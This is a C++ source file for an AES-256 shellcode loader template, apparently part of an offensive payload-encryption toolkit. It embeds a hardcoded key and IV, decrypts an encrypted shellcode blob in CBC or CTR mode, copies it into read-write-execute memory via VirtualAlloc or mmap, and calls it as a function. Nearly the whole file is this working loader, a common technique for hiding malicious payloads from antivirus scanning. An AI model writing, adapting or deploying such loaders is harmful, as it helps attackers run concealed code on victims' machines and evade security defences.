/*
 * aes_loader.cpp - AES-256 shellcode loader template (CBC or CTR)
 * ==============================================================
 * Decrypts an embedded AES blob in place and executes it as a function.
 *
 * Build-time parameters are baked in below (see payloads/aes_cbc_300b.meta.json):
 *   key : 3031323334353637383961626364656630313233343536373839616263646566 (32 B)
 *   iv  : 00112233445566778899aabbccddeeff (16 B)
 *
 * Regenerate the payload include with the builder:
 *   shellcrypt.py -i shellcode.bin -m aes --aes-mode cbc \
 *       --key-hex -k 3031...6566 --iv 00112233445566778899aabbccddeeff \
 *       --verify --meta params.json -f c -o payload_inc.h
 *
 * Compile:
 *   g++ -O2 -Wall -o aes_loader aes_loader.cpp            # CBC (default)
 *   g++ -O2 -Wall -DAES_MODE=1 -o aes_loader aes_loader.cpp  # CTR
 *
 * The AES implementation below is a direct mirror of the FIPS-197 verified
 * reference in the toolkit verifier (round-key schedule + InvCipher).
 */
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <cstdlib>

#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

#include "aes_tables.inc" /* AES_SBOX / AES_INVSBOX / AES_RCON (FIPS-197 verified) */
#include "payload_inc.h"  /* kEncrypted[], kEncryptedLen, kOriginalLen */

#ifndef AES_MODE
#define AES_MODE 0 /* 0 = CBC (PKCS#7 padded), 1 = CTR (full 128-bit BE counter) */
#endif

static const uint8_t kKey[32] = {
    0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x61, 0x62,
    0x63, 0x64, 0x65, 0x66, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
    0x38, 0x39, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66
};
static const uint8_t kIv[16] = {
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
    0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff
};

/* ------------------------------------------------------------------ */
/* AES primitives (byte-oriented, mirrors the FIPS-197 verified Python) */
/* ------------------------------------------------------------------ */

/* FIPS-197 RotWord: left rotate by 8 bits. */
static uint32_t rotl8(uint32_t x) { return (x << 8) | (x >> 24); }

/* Expand `nk` 32-bit words of key into 4*(Nr+1) round-key words (Nr = nk+6). */
static void aes_key_expand(const uint8_t key[32], unsigned nk, uint32_t w[60]) {
    unsigned nr = nk + 6;
    for (unsigned i = 0; i < nk; i++)
        w[i] = ((uint32_t)key[4 * i] << 24) | ((uint32_t)key[4 * i + 1] << 16) |
               ((uint32_t)key[4 * i + 2] << 8) | (uint32_t)key[4 * i + 3];
    for (unsigned i = nk; i < 4 * (nr + 1); i++) {
        uint32_t t = w[i - 1];
        if (i % nk == 0) {
            t = rotl8(t);
            t = ((uint32_t)AES_SBOX[t >> 24] << 24) |
                ((uint32_t)AES_SBOX[(t >> 16) & 0xff] << 16) |
                ((uint32_t)AES_SBOX[(t >> 8) & 0xff] << 8) | AES_SBOX[t & 0xff];
            t ^= (uint32_t)AES_RCON[i / nk - 1] << 24;
        } else if (nk > 6 && i % nk == 4) {
            t = ((uint32_t)AES_SBOX[t >> 24] << 24) |
                ((uint32_t)AES_SBOX[(t >> 16) & 0xff] << 16) |
                ((uint32_t)AES_SBOX[(t >> 8) & 0xff] << 8) | AES_SBOX[t & 0xff];
        }
        w[i] = w[i - nk] ^ t;
    }
}

static uint8_t gmul(uint8_t a, uint8_t b) {
    uint8_t r = 0;
    while (b) {
        if (b & 1) r ^= a;
        a = (uint8_t)((a << 1) ^ ((a >> 7) * 0x1b));
        b >>= 1;
    }
    return r;
}

#if AES_MODE == 1
/* FIPS-197 MixColumns (via GF(2^8) multiplication). */
static void mix_columns(uint8_t s[16]) {
    for (unsigned c = 0; c < 4; c++) {
        uint8_t col[4] = {s[4 * c], s[4 * c + 1], s[4 * c + 2], s[4 * c + 3]};
        for (unsigned i = 0; i < 4; i++)
            s[4 * c + i] = gmul(col[i], 2) ^ gmul(col[(i + 1) % 4], 3) ^
                           col[(i + 2) % 4] ^ col[(i + 3) % 4];
    }
}

static void aes_encrypt_block(const uint32_t w[60], unsigned nr,
                              const uint8_t in[16], uint8_t out[16]) {
    uint8_t s[16];
    for (unsigned i = 0; i < 16; i++)
        s[i] = in[i] ^ (uint8_t)(w[i / 4] >> (24 - 8 * (i % 4)));
    static const int sr[16] = {0, 5, 10, 15, 4, 9, 14, 3, 8, 13, 2, 7, 12, 1, 6, 11};
    uint8_t t[16];
    for (unsigned rnd = 1; rnd <= nr; rnd++) {
        for (unsigned i = 0; i < 16; i++) s[i] = AES_SBOX[s[i]];
        memcpy(t, s, 16);
        for (unsigned i = 0; i < 16; i++) s[i] = t[sr[i]];
        if (rnd < nr) mix_columns(s);
        for (unsigned i = 0; i < 16; i++)
            s[i] ^= (uint8_t)(w[4 * rnd + i / 4] >> (24 - 8 * (i % 4)));
    }
    memcpy(out, s, 16);
}

#else
/* FIPS-197 InvMixColumns. */
static void inv_mix_columns(uint8_t s[16]) {
    for (unsigned c = 0; c < 4; c++) {
        uint8_t col[4] = {s[4 * c], s[4 * c + 1], s[4 * c + 2], s[4 * c + 3]};
        for (unsigned i = 0; i < 4; i++)
            s[4 * c + i] = gmul(col[i], 14) ^ gmul(col[(i + 1) % 4], 11) ^
                           gmul(col[(i + 2) % 4], 13) ^ gmul(col[(i + 3) % 4], 9);
    }
}

static void aes_decrypt_block(const uint32_t w[60], unsigned nr,
                              const uint8_t in[16], uint8_t out[16]) {
    uint8_t s[16];
    for (unsigned i = 0; i < 16; i++)
        s[i] = in[i] ^ (uint8_t)(w[4 * nr + i / 4] >> (24 - 8 * (i % 4)));
    for (unsigned i = 0; i < 16; i++) s[i] = AES_INVSBOX[s[i]];
    static const int isr[16] = {0, 13, 10, 7, 4, 1, 14, 11, 8, 5, 2, 15, 12, 9, 6, 3};
    uint8_t t[16];
    memcpy(t, s, 16);
    for (unsigned i = 0; i < 16; i++) s[i] = t[isr[i]];
    for (int rnd = (int)nr - 1; rnd > 0; rnd--) {
        for (unsigned i = 0; i < 16; i++)
            s[i] ^= (uint8_t)(w[4 * rnd + i / 4] >> (24 - 8 * (i % 4)));
        inv_mix_columns(s);
        for (unsigned i = 0; i < 16; i++) s[i] = AES_INVSBOX[s[i]];
        memcpy(t, s, 16);
        for (unsigned i = 0; i < 16; i++) s[i] = t[isr[i]];
    }
    for (unsigned i = 0; i < 16; i++)
        s[i] ^= (uint8_t)(w[i / 4] >> (24 - 8 * (i % 4)));
    memcpy(out, s, 16);
}
#endif

/* ------------------------------------------------------------------ */

#if AES_MODE == 0
static int aes_cbc_decrypt(const uint8_t *ct, unsigned ct_len, uint8_t *pt_out,
                           unsigned *pt_len) {
    if (ct_len == 0 || ct_len % 16) return -1;
    uint32_t w[60];
    aes_key_expand(kKey, sizeof(kKey) / 4, w);
    unsigned nr = sizeof(kKey) / 4 + 6;
    uint8_t prev[16], dec[16];
    memcpy(prev, kIv, 16);
    for (unsigned off = 0; off < ct_len; off += 16) {
        aes_decrypt_block(w, nr, ct + off, dec);
        for (unsigned i = 0; i < 16; i++) {
            pt_out[off + i] = dec[i] ^ prev[i];
            prev[i] = ct[off + i];
        }
    }
    unsigned pad = pt_out[ct_len - 1]; /* PKCS#7 */
    if (pad == 0 || pad > 16) return -1;
    for (unsigned i = ct_len - pad; i < ct_len; i++)
        if (pt_out[i] != pad) return -1;
    *pt_len = ct_len - pad;
    return 0;
}

/* CTR: keystream = AES_encrypt(counter); counter starts at kIv and
 * increments as a full 128-bit big-endian integer (matches pycryptodome
 * with nonce=b"" and initial_value=iv - verified in the toolkit). */
#else
static void incr128be(uint8_t ctr[16]) {
    for (int i = 15; i >= 0; i--)
        if (++ctr[i]) break;
}

static void aes_ctr_decrypt(const uint8_t *ct, unsigned ct_len, uint8_t *pt_out) {
    uint32_t w[60];
    aes_key_expand(kKey, sizeof(kKey) / 4, w);
    unsigned nr = sizeof(kKey) / 4 + 6;
    uint8_t ctr[16], ks[16];
    memcpy(ctr, kIv, 16);
    for (unsigned off = 0; off < ct_len; off += 16) {
        aes_encrypt_block(w, nr, ctr, ks);
        incr128be(ctr);
        unsigned n = (ct_len - off < 16) ? (ct_len - off) : 16;
        for (unsigned i = 0; i < n; i++) pt_out[off + i] = ct[off + i] ^ ks[i];
    }
}
#endif

/* ------------------------------------------------------------------ */
/* Simple execution method: map RWX, copy, call as a function.         */
/* ------------------------------------------------------------------ */

static int run_payload(const uint8_t *p, size_t n) {
#ifdef _WIN32
    void *mem = VirtualAlloc(NULL, n, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) { printf("[-] VirtualAlloc failed\n"); return -1; }
#else
    void *mem = mmap(NULL, n, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) { printf("[-] mmap failed\n"); return -1; }
#endif
    memcpy(mem, p, n);
    int (*fn)() = (int (*)())mem;
    int r = fn();
#ifdef _WIN32
    VirtualFree(mem, 0, MEM_RELEASE);
#else
    munmap(mem, n);
#endif
    return r;
}

int main(void) {
    static uint8_t plain[4096];
    unsigned plain_len = 0;
    int ok;

#if AES_MODE == 1
    if (kEncryptedLen > sizeof(plain)) return 1;
    aes_ctr_decrypt(kEncrypted, kEncryptedLen, plain);
    plain_len = kOriginalLen;
    ok = 0;
#else
    ok = aes_cbc_decrypt(kEncrypted, kEncryptedLen, plain, &plain_len);
#endif
    if (ok != 0) { printf("[-] decrypt failed\n"); return 1; }
    if (plain_len != kOriginalLen) { printf("[-] length mismatch\n"); return 1; }

    printf("[+] AES-%u-%s decrypted %u bytes\n", (unsigned)sizeof(kKey) * 8,
           AES_MODE == 1 ? "CTR" : "CBC", plain_len);
    int r = run_payload(plain, plain_len);
    printf("[+] payload returned %d\n", r);
    (void)r;
    return 0; /* demo payloads return 42/1; keep exit code 0 */
}
